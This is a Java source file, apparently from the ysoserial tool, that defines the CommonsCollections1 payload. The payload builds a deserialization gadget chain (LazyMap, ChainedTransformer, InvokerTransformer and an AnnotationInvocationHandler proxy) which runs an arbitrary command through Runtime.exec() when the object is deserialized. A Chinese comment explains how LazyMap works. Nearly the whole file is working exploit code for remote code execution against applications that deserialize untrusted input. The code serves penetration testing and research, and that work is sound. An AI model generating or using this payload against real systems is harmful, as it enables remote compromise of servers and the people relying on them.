package ysoserial.payloads;

import java.lang.reflect.InvocationHandler;
import java.util.HashMap;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.annotation.PayloadTest;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.JavaVersion;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Gadget chain:
		ObjectInputStream.readObject()
			AnnotationInvocationHandler.readObject()
				Map(Proxy).entrySet()
					AnnotationInvocationHandler.invoke()
						LazyMap.get()
							ChainedTransformer.transform()
								ConstantTransformer.transform()
								InvokerTransformer.transform()
									Method.invoke()
										Class.getMethod()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.getRuntime()
								InvokerTransformer.transform()
									Method.invoke()
										Runtime.exec()

	Requires:
		commons-collections
 */
@SuppressWarnings({"rawtypes", "unchecked"})
@PayloadTest(precondition = "isApplicableJavaVersion")
@Dependencies({"commons-collections:commons-collections:3.1"})
@Authors({Authors.FROHOFF})
public class CommonsCollections1 extends PayloadRunner implements ObjectPayload<InvocationHandler> {
    /**
     * 所谓LazyMap，意思就是这个Map中的键/值对一开始并不存在，当被调用到时才创建.
     * 我们这样来理解：我们需要一个Map，但是由于创建成员的方法很“重”（比如数据库访问），
     * 或者我们只有在调用get()时才知道如何创建，或者Map中出现的可能性很多很多，
     * 我们无法在get()之前添加所有可能出现的键/值对，
     * 我们觉得没有必要去初始化一个Map而又希望它可以在必要时自动处理数据
     * transformerChain实际上有点像python的生成器(generator)，帮忙在get(key)的时候生成代码value值。
     */

    public InvocationHandler getObject(final String command) throws Exception {
        final String[] execArgs = new String[]{command};
        // inert chain for setup
        final Transformer transformerChain = new ChainedTransformer(
            new Transformer[]{new ConstantTransformer(1)});
        // real chain for after setup
        final Transformer[] transformers = new Transformer[]{
            new ConstantTransformer(Runtime.class),
            new InvokerTransformer("getMethod", new Class[]{
                String.class, Class[].class}, new Object[]{
                "getRuntime", new Class[0]}),
            new InvokerTransformer("invoke", new Class[]{
                Object.class, Object[].class}, new Object[]{
                null, new Object[0]}),
            new InvokerTransformer("exec",
                new Class[]{String.class}, execArgs),
            new ConstantTransformer(1)};

        final Map innerMap = new HashMap();

        final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

        final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class);

        final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy);

        Reflections.setFieldValue(transformerChain, "iTransformers", transformers); // arm with actual transformer chain

        return handler;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollections1.class, args);
    }

    public static boolean isApplicableJavaVersion() {
        return JavaVersion.isAnnInvHUniversalMethodImpl();
    }
}
